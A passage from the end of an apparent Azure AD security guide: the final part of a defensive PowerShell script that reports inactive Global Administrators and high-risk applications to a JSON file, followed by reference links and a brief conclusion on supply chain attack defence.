        $lastSignIn = Get-AzureADUser -ObjectId $admin.ObjectId | Select-Object -ExpandProperty RefreshTokensValidFromDateTime

        $daysSinceSignIn = ((Get-Date) - $lastSignIn).Days

        if ($daysSinceSignIn -gt 90) {
            $report += @{
                'UserPrincipalName' = $admin.UserPrincipalName
                'DisplayName' = $admin.DisplayName
                'LastSignIn' = $lastSignIn
                'DaysSinceSignIn' = $daysSinceSignIn
                'Risk' = 'Inactive Global Administrator'
            }
        }
    }

    return $report
}

# Main assessment function
function Start-AzureADSecurityAssessment {
    Write-Output "Starting Azure AD Security Assessment..."

    # Assess all applications
    $applications = Get-AzureADApplication -All $true
    $appAssessments = @()

    foreach ($app in $applications) {
        $assessment = Assess-ApplicationSecurity -ApplicationId $app.AppId
        if ($assessment.RiskScore -gt 50) {
            $appAssessments += $assessment
        }
    }

    # Check for overprivileged users
    $overprivilegedUsers = Find-OverprivilegedUsers

    # Generate report
    $report = @{
        'AssessmentDate' = Get-Date
        'HighRiskApplications' = $appAssessments
        'OverprivilegedUsers' = $overprivilegedUsers
        'TotalApplications' = $applications.Count
        'HighRiskApplicationCount' = $appAssessments.Count
    }

    # Export to JSON
    $report | ConvertTo-Json -Depth 4 | Out-File "AzureAD_Security_Assessment_$(Get-Date -Format 'yyyyMMdd_HHmmss').json"

    Write-Output "Assessment completed. Report saved."
    return $report
}

# Run the assessment
Start-AzureADSecurityAssessment
```

## References and Resources

- [Azure AD Attack and Defense Playbook](https://github.com/Cloud-Architekt/AzureAD-Attack-Defense)
- [Microsoft Identity Platform Security](https://docs.microsoft.com/en-us/azure/active-directory/develop/security-best-practices)
- [Azure AD Security Operations Guide](https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations)
- [MITRE ATT&CK for Azure AD](https://attack.mitre.org/techniques/enterprise/cloud/)
- [Azure AD Incident Response Playbook](https://github.com/Azure/Azure-Sentinel/tree/master/Playbooks)

## Conclusion

Azure AD security requires constant vigilance against sophisticated supply chain attacks. The techniques documented here represent real-world attack methods used by advanced persistent threat groups. Organizations must implement comprehensive monitoring, zero-trust principles, and robust incident response capabilities to defend against Azure AD-based supply chain compromises.